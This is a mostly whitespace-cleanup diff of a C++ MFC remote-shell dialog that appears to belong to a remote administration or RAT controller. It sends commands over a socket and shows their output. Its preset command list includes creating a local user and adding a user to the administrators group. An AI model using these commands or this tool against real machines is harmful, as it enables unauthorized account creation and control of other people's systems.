@@ -81,26 +81,26 @@ void CShellDlg::StatusTextOut(int iPane,LPCTSTR ptzFormat, ...)
 BOOL CShellDlg::OnShowWindow(BOOL bShow, UINT nStatus)
 {
 	CDialog::OnShowWindow(bShow, nStatus);
-	
-	GetDlgItem(IDC_COMBO_CMDLINE)-> SetFocus(); 
+
+	GetDlgItem(IDC_COMBO_CMDLINE)-> SetFocus();
 
 	UpdateData(FALSE);
 	return TRUE;
 }
 
-BOOL CShellDlg::OnInitDialog() 
+BOOL CShellDlg::OnInitDialog()
 {
 	CDialog::OnInitDialog();
 
 	// Set the small icon for this dialog
-	SetIcon(AfxGetApp()->LoadIcon(IDI_OL_DOS), FALSE);	
+	SetIcon(AfxGetApp()->LoadIcon(IDI_OL_DOS), FALSE);
 	CenterWindow();
 	// TODO: Add extra initialization here
 	//create statusbar=============================
 	m_wndStatusBar.Create(WS_CHILD|WS_VISIBLE|CCS_BOTTOM,  CRect(0,0,0,0),  this,  0x1300001);
 	int strPartDim[2]= {400,-1};
 	m_wndStatusBar.SetParts(2,strPartDim);
-	
+
 	m_CmdEdit.AddText("Microsoft Windows XP [版本 5.1.2600]\r\n"
 					  "(C) 版权所有 1985-2001 Microsoft Corp.\r\n"
 					  "\r\nCommand>");
@@ -113,9 +113,9 @@ BOOL CShellDlg::OnInitDialog()
 	pComboBox->AddString("ipconfig");
 	pComboBox->AddString("netstat -ano");
 	pComboBox->AddString("tasklist");
-	pComboBox->AddString("net localgroup administrators user /add");			
+	pComboBox->AddString("net localgroup administrators user /add");
 	pComboBox->AddString("net user username pass /add");
-	
+
 	pComboBox->SetCurSel(1);
 	pComboBox->GetLBText(1, m_strCmdLine);
 
@@ -125,7 +125,7 @@ BOOL CShellDlg::OnInitDialog()
 	return FALSE;
 }
 
-void CShellDlg::PostNcDestroy() 
+void CShellDlg::PostNcDestroy()
 {
 	// TODO: Add your specialized code here and/or call the base class
 	CDialog::PostNcDestroy();
@@ -141,31 +141,31 @@ void CShellDlg::OnOK()
 void CShellDlg::OnCancel()
 {
 	StopWork();
-	
+
 	//非模式对话框，需要这样销毁对话框
 	DestroyWindow();
 	//CDialog::OnCancel();
 }
 
-BOOL CShellDlg::PreTranslateMessage(MSG* pMsg) 
+BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
 {
 	// TODO: Add your specialized code here and/or call the base class
-	if (pMsg->message == WM_KEYDOWN)   
-	{   
-		int nVirtKey = (int)pMsg->wParam;           
-		if (nVirtKey == VK_RETURN)   
-		{   
-			//如果是回车在这里做你要做的事情,或者什么也不作   
+	if (pMsg->message == WM_KEYDOWN)
+	{
+		int nVirtKey = (int)pMsg->wParam;
+		if (nVirtKey == VK_RETURN)
+		{
+			//如果是回车在这里做你要做的事情,或者什么也不作
 			OnBtnShellrun();
-			return TRUE;   
-		}   
-		if (nVirtKey == VK_ESCAPE)   
-		{   
+			return TRUE;
+		}
+		if (nVirtKey == VK_ESCAPE)
+		{
 			//如果是ESC在这里做你要做的事情,或者什么也不作
-			return TRUE;   
-		}   
-	}  
-	
+			return TRUE;
+		}
+	}
+
 	return CDialog::PreTranslateMessage(pMsg);
 }
 
@@ -173,8 +173,8 @@ void CShellDlg::StopWork()
 {
 	//关闭socket
 	shutdown(m_ConnSocket,0x02);
-	closesocket(m_ConnSocket);	
-	
+	closesocket(m_ConnSocket);
+
 	//结束接收线程
 	DWORD dwExitCode;
 	if(m_hWorkThread != NULL)
@@ -191,7 +191,7 @@ void CShellDlg::StopWork()
 	}
 }
 
-void CShellDlg::OnBtnShellrun() 
+void CShellDlg::OnBtnShellrun()
 {
 	UpdateData(TRUE);
 
@@ -241,17 +241,17 @@ DWORD CShellDlg::DOSShell()
 	m_MsgHead.dwCmd  = CMD_SHELLRUN;
 	m_MsgHead.dwSize = m_strCmdLine.GetLength();
 	lstrcpy(m_Buffer,m_strCmdLine);
-	
+
 	m_CmdEdit.AddText(m_strCmdLine);
 	m_CmdEdit.AddText("\r\n");//增加回车符到编辑框中
-	
+
 	CComboBox* pComboBox = (CComboBox*)GetDlgItem(IDC_COMBO_CMDLINE);
-	
+
 	if((pComboBox->FindString(-1,m_Buffer)==CB_ERR))
 	{
 		pComboBox->AddString(m_Buffer);
 	}
-	
+
 	pComboBox->SetCurSel(0);
 	pComboBox->GetLBText(0, m_strCmdLine);
 
@@ -275,10 +275,10 @@ DWORD CShellDlg::DOSShell()
 	//显示信息
 	m_Buffer[m_MsgHead.dwSize] = 0;
 	m_CmdEdit.AddText(m_Buffer);//增加到编辑框中
-	
+
 	m_CmdEdit.AddText("\r\nCommand>");
-	
-	GetDlgItem(IDC_COMBO_CMDLINE)-> SetFocus(); 
+
+	GetDlgItem(IDC_COMBO_CMDLINE)-> SetFocus();
 
 	StatusTextOut(0, "");
 	OnWorkEnd();
@@ -302,10 +302,10 @@ int __stdcall WriteTXT(CHAR LogFile[], CHAR Data[])
 		DWORD rt;
 		HANDLE hFile = CreateFileA(LogFile, GENERIC_ALL, FILE_SHARE_WRITE, 0, OPEN_ALWAYS,
 			FILE_ATTRIBUTE_NORMAL, 0);
-		
+
 		SetFilePointer(hFile, 0, 0, FILE_END);
 		WriteFile(hFile, Data, lstrlenA(Data), &rt, 0);
-		
+
 		CloseHandle(hFile);
 		return 1;
 	}
@@ -316,44 +316,44 @@ int __stdcall WriteTXT(CHAR LogFile[], CHAR Data[])
 	}
 }
 
-void CShellDlg::OnShellSave() 
+void CShellDlg::OnShellSave()
 {
 	//PostMessage(WM_SAVE_DLG, 0, 0);
 
 	char dir[256],path[256]="save_cmd.txt",*cmd;
-	
+
 	GetCurrentDirectory(256,dir);
-	
-	CFileDialog fdlg(FALSE, ".txt" , path , OFN_OVERWRITEPROMPT|OFN_EXPLORER|OFN_NOCHANGEDIR , "Text Files (*.txt)|*.txt|All Files (*.*)|*.*||" , this ); 
-	
+
+	CFileDialog fdlg(FALSE, ".txt" , path , OFN_OVERWRITEPROMPT|OFN_EXPLORER|OFN_NOCHANGEDIR , "Text Files (*.txt)|*.txt|All Files (*.*)|*.*||" , this );
+
 	fdlg.m_ofn.lpstrInitialDir = dir;
-	
+
 	if(IDOK==fdlg.DoModal())
 	{
 		CString sz;
 		sz = fdlg.GetPathName();	//获取文件全路经
-		
+
 		if(sz == "")	return;
-		
-		strcpy(path,sz);
-		
+
+		lstrcpy(path,sz);
+
 		int len = m_CmdEdit.GetWindowTextLength()+128;
-		
+
 		cmd = (char *)VirtualAlloc(0,len,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-		
+
 		m_CmdEdit.GetWindowText(cmd,len);
-		
-		WriteTXT(path,cmd);		
-		
+
+		WriteTXT(path,cmd);
+
 		VirtualFree(cmd,len,MEM_RELEASE);
 	}
 
 	m_CmdEdit.SetSel(0,0,0);
-	
+
 }
 
 
-void CShellDlg::OnShellClear() 
+void CShellDlg::OnShellClear()
 {
 	m_CmdEdit.ClearEdit();
 
@@ -362,19 +362,19 @@ void CShellDlg::OnShellClear()
 					  "\r\nCommand>");
 }
 
-void CShellDlg::OnShellExit() 
+void CShellDlg::OnShellExit()
 {
 	CDialog::OnOK();
 }
 
-void CShellDlg::OnShellHelp() 
+void CShellDlg::OnShellHelp()
 {
 	// TODO: Add your command handler code here
-	
+
 }
 
-void CShellDlg::OnShellAbout() 
+void CShellDlg::OnShellAbout()
 {
 	// TODO: Add your command handler code here
-	
+
 }
